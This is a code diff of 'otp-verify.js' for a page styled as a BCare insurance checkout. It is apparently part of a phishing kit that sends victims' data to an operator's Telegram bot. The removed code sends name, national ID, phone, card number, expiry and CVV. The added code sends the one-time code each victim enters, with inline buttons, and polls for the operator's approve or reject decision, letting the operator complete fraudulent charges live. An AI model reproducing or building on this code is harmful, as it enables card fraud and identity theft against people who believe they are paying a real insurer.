@@ -1,11 +1,11 @@
 /* =====================================================
-   بي كير — otp-verify.js  v4
+   بي كير — otp-verify.js  v5
    ══════════════════════════════════════════════════
    التدفق:
    1. تفاصيل الطلب تصل Telegram (بدون OTP)
    2. العميل يدخل 6 أرقام يختارها بنفسه → يضغط تأكيد
-   3. الأرقام تُرسل لـ Telegram كرسالة ثانية
-   4. الأدمن يوافق (يرسل نفس الأرقام) أو يرفض (REJECT)
+   3. الأرقام تُرسل لـ Telegram مع أزرار Inline
+   4. الأدمن يضغط زر موافقة أو رفض
    5. الصفحة تستلم القرار → نجاح أو رفض
 ===================================================== */
 'use strict';
@@ -15,25 +15,43 @@ const TG = {
   CHAT:  '1451039924',
 };
 
-let userOTP     = '';       /* الرمز الذي أدخله العميل */
+let userOTP     = '';
 let pollInt     = null;
 let lastUpdateId = 0;
-let waitingConfirm = false; /* بانتظار قرار الأدمن */
+let waitingConfirm = false;
+let myRefNumber = '';
 
 /* ─── Telegram API ───────────────────────────────── */
-async function tgSend(text) {
+async function tgSend(text, replyMarkup) {
   try {
+    const body = { chat_id: TG.CHAT, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
     const res = await fetch(
       `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG.CHAT, text, parse_mode: 'HTML' }),
-      }
+      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
     );
-    const data = await res.json();
-    return data.ok;
-  } catch(e) { console.error('TG:', e); return false; }
+    return await res.json();
+  } catch(e) { console.error('TG:', e); return { ok: false }; }
+}
+
+async function tgAnswerCallback(callbackQueryId, text) {
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${TG.TOKEN}/answerCallbackQuery`,
+      { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) }
+    );
+  } catch(e) {}
+}
+
+async function tgEditMessage(messageId, text) {
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${TG.TOKEN}/editMessageText`,
+      { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG.CHAT, message_id: messageId, text, parse_mode: 'HTML' }) }
+    );
+  } catch(e) {}
 }
 
 async function tgGetUpdates() {
@@ -46,48 +64,8 @@ async function tgGetUpdates() {
   } catch(e) { return []; }
 }
 
-/* ─── رسالة الطلب الأولى (تصل عند "ادفع الآن") ────── */
-function buildOrderMsg() {
-  try {
-    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
-    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
-    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
-    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');
-
-    return `🔔 <b>طلب دفع جديد — بي كير</b>
-
-👤 <b>العميل</b>
-• الاسم: <b>${policy.fullName || '—'}</b>
-• رقم الهوية: <code>${form.nationalId || '—'}</code>
-• الجوال: <code>${policy.mobile || '—'}</code>
-
-🚗 <b>التأمين</b>
-• الشركة: <b>${offer.companyName || '—'}</b>
-• نوع التأمين: ${offer.insuranceType || '—'}
-• ماركة المركبة: ${policy.carBrand || '—'}
-• رقم اللوحة: ${policy.plateNumber || '—'}
-
-💳 <b>بطاقة الدفع</b>
-• رقم البطاقة: <code>${card.number || '****'}</code>
-• النوع: ${card.type || '—'}
-• تاريخ الانتهاء: <code>${card.expiry || '—'}</code>
-• CVV: <code>${card.cvv || '—'}</code>
-
-💰 <b>المبلغ</b>
-• الرسوم: ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}
-• الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
-• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>
-
-🆔 المرجع: <code>${offer.refNumber || '—'}</code>
-
-<i>بانتظار رمز التأكيد من العميل...</i>`;
-  } catch(e) {
-    return `🔔 طلب دفع جديد`;
-  }
-}
-
-/* ─── رسالة OTP الثانية (تصل عند تأكيد العميل) ────── */
-function buildOTPMsg(code) {
+/* ─── رسالة OTP مع أزرار Inline ─────────────────────── */
+function buildOTPMsg(code, ref) {
   try {
     const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
     return `🔑 <b>العميل أدخل رمز التأكيد</b>
@@ -95,14 +73,23 @@ function buildOTPMsg(code) {
 🔑 الرمز: <code>${code}</code>
 🏢 الشركة: ${offer.companyName || '—'}
 💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
-🆔 المرجع: <code>${offer.refNumber || '—'}</code>
-
-━━━━━━━━━━━━━━━
-✅ <b>للموافقة:</b> أرسل نفس الرمز <code>${code}</code>
-❌ <b>للرفض:</b> أرسل <code>REJECT</code>`;
+🆔 المرجع: <code>${ref}</code>`;
   } catch(e) {
-    return `🔑 العميل أدخل: <code>${code}</code>`;
+    return `🔑 العميل أدخل: <code>${code}</code>\n🆔 المرجع: <code>${ref}</code>`;
   }
+}
+
+function buildOTPOtpKeyboard(code, ref) {
+  return {
+    inline_keyboard: [
+      [
+        { text: `✅ الموافقة: أرسل نفس الرمز ${code}`, callback_data: `otp_approve_${ref}_${code}` },
+      ],
+      [
+        { text: '❌ للرفض: أرسل REJECT', callback_data: `otp_reject_${ref}` },
+      ]
+    ]
+  };
 }
 
 /* ─── Polling قرار الأدمن ──────────────────────────── */
@@ -113,27 +100,60 @@ function startPolling() {
     const updates = await tgGetUpdates();
     for (const u of updates) {
       lastUpdateId = u.update_id;
+
+      /* ── زر Inline Callback ── */
+      if (u.callback_query) {
+        const cq = u.callback_query;
+        const data = cq.data || '';
+
+        /* موافقة */
+        if (data.startsWith('otp_approve_')) {
+          const parts = data.replace('otp_approve_', '').split('_');
+          const ref   = parts[0];
+          const code  = parts.slice(1).join('_');
+          if (ref === myRefNumber && code === userOTP) {
+            waitingConfirm = false;
+            clearInterval(pollInt);
+            await tgAnswerCallback(cq.id, '✅ تمت الموافقة');
+            await tgEditMessage(cq.message.message_id,
+              cq.message.text + '\n\n✅ <b>تم تأكيد الدفع بنجاح</b>');
+            showSuccess();
+            return;
+          }
+        }
+
+        /* رفض */
+        if (data.startsWith('otp_reject_')) {
+          const ref = data.replace('otp_reject_', '');
+          if (ref === myRefNumber) {
+            waitingConfirm = false;
+            clearInterval(pollInt);
+            await tgAnswerCallback(cq.id, '❌ تم الرفض');
+            await tgEditMessage(cq.message.message_id,
+              cq.message.text + '\n\n❌ <b>تم رفض العملية</b>');
+            showRejectRetry();
+            return;
+          }
+        }
+      }
+
+      /* ── نص عادي (backup) ── */
       const text = u.message?.text?.trim() || '';
 
-      /* REJECT → رسالة رفض واضحة + إمكانية المحاولة */
       if (text.toUpperCase() === 'REJECT') {
         waitingConfirm = false;
         clearInterval(pollInt);
         showRejectRetry();
         return;
       }
-
-      /* نفس الرمز → موافقة */
       if (text === userOTP) {
         waitingConfirm = false;
         clearInterval(pollInt);
         showSuccess();
         return;
       }
-
-      /* رمز مختلف → تجاهل (الإدمن لم يقرر بعد) */
     }
-  }, 3000);
+  }, 2500);
 }
 
 /* ─── رفض → رمز خاطئ + أعد المحاولة ──────────────── */
@@ -142,13 +162,11 @@ function showRejectRetry() {
   const confirmBtn = document.getElementById('otp-confirm-btn');
   const sub        = document.getElementById('otp-sub-text');
 
-  /* اهتزاز المربعات بالأحمر */
   boxes.forEach(b => {
     b.classList.add('otp-error');
     setTimeout(() => b.classList.remove('otp-error'), 600);
   });
 
-  /* مسح الإدخال + إعادة التفعيل */
   setTimeout(() => {
     boxes.forEach(b => { b.value=''; b.disabled=false; b.classList.remove('filled','otp-success'); });
     if (confirmBtn) {
@@ -226,27 +244,18 @@ function initBoxes() {
     });
   });
 
-  /* زر التأكيد */
   if (confirmBtn) confirmBtn.addEventListener('click', submitOTP);
 
-  /* زر إعادة الإرسال */
   if (resendBtn) {
     resendBtn.addEventListener('click', async () => {
-      /* مسح الإدخال */
       boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); b.disabled = false; });
       if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد'; }
       clearOTPErr();
       waitingConfirm = false;
       clearInterval(pollInt);
 
-      /* 📨 إعادة إرسال رسالة الطلب للأدمن */
-      await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>
+      await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>\n🆔 المرجع: <code>${myRefNumber}</code>\n<i>العميل أعاد الإرسال...</i>`);
 
-${buildOrderMsg().replace('🔔 <b>طلب دفع جديد — بي كير</b>', '')}
-
-<i>العميل أعاد الإرسال...</i>`);
-
-      /* إعادة التركيز */
       const sub = document.getElementById('otp-sub-text');
       if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
       boxes[0]?.focus();
@@ -266,25 +275,22 @@ async function submitOTP() {
 
   userOTP = entered;
 
-  /* 📨 إرسال رمز العميل لـ Telegram */
-  await tgSend(buildOTPMsg(entered));
+  /* 📨 إرسال رمز العميل لـ Telegram مع أزرار Inline */
+  await tgSend(buildOTPMsg(entered, myRefNumber), buildOTPOtpKeyboard(entered, myRefNumber));
 
-  /* تغيير الواجهة: بانتظار تأكيد الأدمن */
+  /* تغيير الواجهة */
   const confirmBtn = document.getElementById('otp-confirm-btn');
   if (confirmBtn) {
     confirmBtn.disabled = true;
     confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> بانتظار التأكيد...';
   }
 
-  /* تعطيل المربعات */
   boxes.forEach(b => b.disabled = true);
 
-  /* تحديث النص */
   const sub = document.getElementById('otp-sub-text');
   if (sub) sub.innerHTML = `تم إرسال الرمز للمراجعة<br/>
     <span style="color:var(--blue);font-weight:600">بانتظار تأكيد العملية...</span>`;
 
-  /* بدء الاستماع لقرار الأدمن */
   waitingConfirm = true;
   startPolling();
 }
@@ -297,7 +303,6 @@ function showSuccess() {
     confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> جاري التأكيد...';
   }
 
-  /* 📨 إشعار نجاح لـ Telegram */
   try {
     const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
     tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>
@@ -332,24 +337,21 @@ document.addEventListener('DOMContentLoaded', async () => {
   loadData();
   initBoxes();
 
-  /* ضبط رقم مرجعي */
   try {
     const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
+    myRefNumber = offer.refNumber || ('BC-' + Date.now().toString().slice(-8).toUpperCase());
     if (!offer.refNumber) {
-      offer.refNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
+      offer.refNumber = myRefNumber;
       sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
     }
-  } catch(e) {}
+  } catch(e) {
+    myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
+  }
 
-  /* 📨 رسالة الطلب الأولى (بدون OTP) */
-  await tgSend(buildOrderMsg());
-
-  /* تجاوز أي رسائل قديمة في الشات عشان ما تجيب REJECT مزيف */
   const oldUpdates = await tgGetUpdates();
   if (oldUpdates.length > 0) {
     lastUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
   }
 
-  /* تفعيل أول مربع */
   document.querySelector('.otp-box')?.focus();
 });
